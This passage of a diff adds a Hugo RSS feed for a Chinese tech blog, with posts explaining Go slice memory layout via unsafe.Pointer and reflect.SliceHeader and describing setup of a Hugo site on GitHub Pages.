+	&lt;span style=&#34;color:#a6e22e&#34;&gt;Data&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;uintptr&lt;/span&gt;
+	&lt;span style=&#34;color:#a6e22e&#34;&gt;Len&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;
+	&lt;span style=&#34;color:#a6e22e&#34;&gt;Cap&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;现在，创建一个slice然后打印每个元素的地址。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;]&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;{&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;}
+&lt;span style=&#34;color:#a6e22e&#34;&gt;s&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]
+&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%p, %p, %p \n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;s&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;s&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;s&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;])
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上述代码的打印结果类似：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;0xc42001a068, 0xc42001a070, 0xc42001a078 
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;转换成十进制后三个地址相差8，因为Go中的&lt;code&gt;int&lt;/code&gt;在64位CPU的机器占8字节。既然&lt;code&gt;slice&lt;/code&gt;底层数据结构是&lt;code&gt;SliceHeader&lt;/code&gt;，那么其元素地址和&lt;code&gt;SliceHeader&lt;/code&gt;的地址有什么关系呢？要解决这个问题，首先需要获取到&lt;code&gt;SliceHeader&lt;/code&gt;的地址，&lt;code&gt;unsafe.Pointer&lt;/code&gt;能做到这点。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sliceHeaderPtr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;reflect&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;SliceHeader&lt;/span&gt;)(&lt;span style=&#34;color:#a6e22e&#34;&gt;unsafe&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Pointer&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;s&lt;/span&gt;))
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;&amp;amp;s&lt;/code&gt;表示对&lt;code&gt;s&lt;/code&gt;进行取址，它的类型是&lt;code&gt;*[]int&lt;/code&gt;，即指向&lt;code&gt;s&lt;/code&gt;的指针。然后&lt;code&gt;unsafe.Pointer(&amp;amp;s)&lt;/code&gt;将&lt;code&gt;*[]int&lt;/code&gt;转换成&lt;code&gt;unsafe.Pointer&lt;/code&gt;类型，之所以能完成这种转换，因为&lt;code&gt;unsafa.Pointer&lt;/code&gt;有以下特性：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;- A pointer value of any type can be converted to a Pointer.
+- A Pointer can be converted to a pointer value of any type.
+- A uintptr can be converted to a Pointer.
+- A Pointer can be converted to a uintptr.
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/golang/go/blob/master/src/unsafe/unsafe.go#L17&#34;&gt;参考&lt;/a&gt;。&lt;/p&gt;
+&lt;p&gt;最后将&lt;code&gt;unsafe.Pointer&lt;/code&gt;类型转换成&lt;code&gt;*reflect.SliceHeader&lt;/code&gt;类型。现在可以查看&lt;code&gt;SliceHeader&lt;/code&gt;的地址：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sliceHeaderPtr保存的地址：%p\n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;sliceHeaderPtr&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// 0xc42000a080
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;因为&lt;code&gt;sliceHeaderPtr&lt;/code&gt;是&lt;code&gt;reflect.SliceHeader&lt;/code&gt;的指针类型，所以其值是&lt;code&gt;reflect.SliceHeader&lt;/code&gt;的地址，可以判断，这个地址和&lt;code&gt;sliceHeaderPtr.Data&lt;/code&gt;的地址是相同的，即struct的地址就是第一个成员的地址。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sliceHeaderPtr.Data: 0x%x\n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;sliceHeaderPtr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Data&lt;/span&gt;)) &lt;span style=&#34;color:#75715e&#34;&gt;// 0xc42000a080
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sliceHeaderPtr.Len: 0x%x\n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;sliceHeaderPtr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Len&lt;/span&gt;)) &lt;span style=&#34;color:#75715e&#34;&gt;// 0xc42000a088
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sliceHeaderPtr.Cap: 0x%x\n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;sliceHeaderPtr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Cap&lt;/span&gt;)) &lt;span style=&#34;color:#75715e&#34;&gt;// 0xc42000a090
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;因为&lt;code&gt;SliceHeader&lt;/code&gt;三个成员均占8字节，所以其地址对应的十进制相差8。
+&lt;code&gt;sliceHeaderPtr.Data&lt;/code&gt;是&lt;code&gt;uintptr&lt;/code&gt;类型，其值应该是&lt;code&gt;s[0]&lt;/code&gt;的地址，同时也&lt;code&gt;arr[1]&lt;/code&gt;的地址。注意&lt;code&gt;sliceHeaderPtr.Data&lt;/code&gt;的地址和&lt;code&gt;sliceHeaderPtr.Data&lt;/code&gt;所保存的地址间的区别。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sliceHeaderPtr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Data&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;uintptr&lt;/span&gt;)(&lt;span style=&#34;color:#a6e22e&#34;&gt;unsafe&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Pointer&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;s&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;])) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;sliceHeaderPtr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Data&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;uintptr&lt;/span&gt;)(&lt;span style=&#34;color:#a6e22e&#34;&gt;unsafe&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Pointer&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])) {
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Println&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;)
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;完整示例：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;package&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;
+
+&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; (
+	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fmt&amp;#34;&lt;/span&gt;
+	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;reflect&amp;#34;&lt;/span&gt;
+	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;unsafe&amp;#34;&lt;/span&gt;
+)
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {
+	&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;]&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;{&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;}
+	&lt;span style=&#34;color:#a6e22e&#34;&gt;s&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]
+	&lt;span style=&#34;color:#a6e22e&#34;&gt;sliceHeaderPtr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;reflect&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;SliceHeader&lt;/span&gt;)(&lt;span style=&#34;color:#a6e22e&#34;&gt;unsafe&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Pointer&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;s&lt;/span&gt;))
+	&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%p, %p, %p \n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;s&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;s&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;s&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;])
+	&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sliceHeaderPtr保存的地址：%p\n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;sliceHeaderPtr&lt;/span&gt;)
+	&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sliceHeaderPtr.Data保存的地址：0x%x\n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;sliceHeaderPtr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Data&lt;/span&gt;)
+	&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sliceHeaderPtr.Data: 0x%x\n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;sliceHeaderPtr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Data&lt;/span&gt;))
+	&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sliceHeaderPtr.Len: 0x%x\n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;sliceHeaderPtr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Len&lt;/span&gt;))
+	&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sliceHeaderPtr.Cap: 0x%x\n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;sliceHeaderPtr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Cap&lt;/span&gt;))
+	&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%d, %d, %d\n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xc42000a080&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xc42000a088&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xc42000a090&lt;/span&gt;)
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sliceHeaderPtr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Data&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;uintptr&lt;/span&gt;)(&lt;span style=&#34;color:#a6e22e&#34;&gt;unsafe&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Pointer&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;s&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;])) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
+		&lt;span style=&#34;color:#a6e22e&#34;&gt;sliceHeaderPtr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Data&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;uintptr&lt;/span&gt;)(&lt;span style=&#34;color:#a6e22e&#34;&gt;unsafe&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Pointer&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])) {
+		&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Println&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;)
+	}
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+    </item>
+    <item>
+      <title>折腾hugo</title>
+      <link>https://username.github.io/%E6%8A%98%E8%85%BEhugo/</link>
+      <pubDate>Sun, 09 Jun 2019 22:42:17 +0800</pubDate>
+      <guid>https://username.github.io/%E6%8A%98%E8%85%BEhugo/</guid>
+      <description>&lt;p&gt;阿里云的服务器过期，费用不菲，暂不续，迁到&lt;code&gt;github page&lt;/code&gt;。以前用hexo，觉得不错，静态网页，完全控制页面功能不简单，速度块。之前用阿里云，因为用&lt;code&gt;Laravel&lt;/code&gt;写博客页面功能容易掌控。既然是信息类网站，类似&lt;code&gt;hexo&lt;/code&gt;或&lt;code&gt;hugo&lt;/code&gt;这种直接基于&lt;code&gt;markdown&lt;/code&gt;文件配合主题根据配置生成静态页面的工具完全能够胜任一些基本的展示工作。为什么选&lt;code&gt;hugo&lt;/code&gt;而不是&lt;code&gt;hexo&lt;/code&gt;？一是因为&lt;code&gt;hugo&lt;/code&gt;采用&lt;code&gt;Go&lt;/code&gt;实现，执行常规的命令例如创建页面，构建网站等速度上稍微快一些。并且，支持&lt;code&gt;Go&lt;/code&gt;。二是因为实在不想看到&lt;code&gt;hexo&lt;/code&gt;下载的一堆依赖。前端深似海，入行需谨慎。&lt;/p&gt;
+&lt;h2 id=&#34;小试牛刀&#34;&gt;小试牛刀&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;hugo&lt;/code&gt;的文档挺多，方方面面，跟着文档走靠谱。但可能不想通读文档，遇到需要的功能点直接搜，以下是我用到的功能点和相关文档。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;直接使用&lt;code&gt;hugo&lt;/code&gt;构建网站，设置&lt;code&gt;draft: true&lt;/code&gt;的文章不会被构建，使用&lt;code&gt;-D --buildDrafts&lt;/code&gt;参数，&lt;a href=&#34;https://gohugo.io/getting-started/usage/#draft-future-and-expired-content&#34;&gt;参考&lt;/a&gt;。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;文章的&lt;code&gt;front matter&lt;/code&gt;默认使用&lt;code&gt;yaml&lt;/code&gt;格式（&lt;code&gt;hugo&lt;/code&gt;版本&lt;code&gt;v0.55.6/extended&lt;/code&gt;），参考&lt;a href=&#34;https://gohugo.io/content-management/front-matter/&#34;&gt;front matter&lt;/a&gt;。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;自定义摘要，在&lt;code&gt;front matter&lt;/code&gt;中定义&lt;code&gt;summary: this is summary of your article&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;定义文章标签，在&lt;code&gt;front matter&lt;/code&gt;中定义，例如：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;tags:
+  - go
+  - php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;在列表也显示与标题对应的图片，在&lt;code&gt;front matter&lt;/code&gt;中定义，例如：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;featured_image: /images/default.png
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;图片&lt;code&gt;default.png&lt;/code&gt;放在&lt;code&gt;static/images/&lt;/code&gt;目录，&lt;code&gt;/images/default.png&lt;/code&gt;这种用法也可以在文章中使用。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;在&lt;code&gt;config.toml&lt;/code&gt;中设置网站语言，例如&lt;code&gt;defaultContentLanguage: zh&lt;/code&gt;。渲染文章内容的主题（目前使用&lt;a href=&#34;https://github.com/budparr/gohugo-theme-ananke&#34;&gt;ananke&lt;/a&gt;）模板是&lt;code&gt;layouts/_default/single.html&lt;/code&gt;，显示右侧“目录”和“相关内容”的&lt;code&gt;html&lt;/code&gt;如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;aside&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;w-30-l mt6-l&amp;#34;&lt;/span&gt;&amp;gt;
+    {{- partial &amp;#34;menu-contextual.html&amp;#34; . -}}
+&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;aside&lt;/span&gt;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在&lt;code&gt;menu-contextual.html&lt;/code&gt;中使用如下的调用来显示&amp;quot;相关文章&amp;quot;四字。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;{{ i18n &amp;#34;related&amp;#34;}}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;而&lt;code&gt;related&lt;/code&gt;的定义在&lt;code&gt;i18n/zh.toml&lt;/code&gt;中，例如：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-toml&#34; data-lang=&#34;toml&#34;&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;related&lt;/span&gt;]
+&lt;span style=&#34;color:#a6e22e&#34;&gt;other&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;相关文章&amp;#34;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;定一个目录的简要描述，可定义例如&lt;code&gt;posts/_index.md&lt;/code&gt;文件，内容如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;---
+  &lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;文章&amp;#34;&lt;/span&gt;
+  &lt;span style=&#34;color:#f92672&#34;&gt;description&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;想写就写的&amp;#34;&lt;/span&gt;
+  &lt;span style=&#34;color:#f92672&#34;&gt;featured_image&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
+---
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;参考主题&lt;a href=&#34;https://github.com/budparr/gohugo-theme-ananke&#34;&gt;ananke&lt;/a&gt;的&lt;a href=&#34;https://github.com/budparr/gohugo-theme-ananke/tree/master/exampleSite&#34;&gt;exampleSite&lt;/a&gt;。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;在&lt;code&gt;config.toml&lt;/code&gt;中定义&lt;code&gt;favicon&lt;/code&gt;的链接：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-toml&#34; data-lang=&#34;toml&#34;&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;params&lt;/span&gt;]
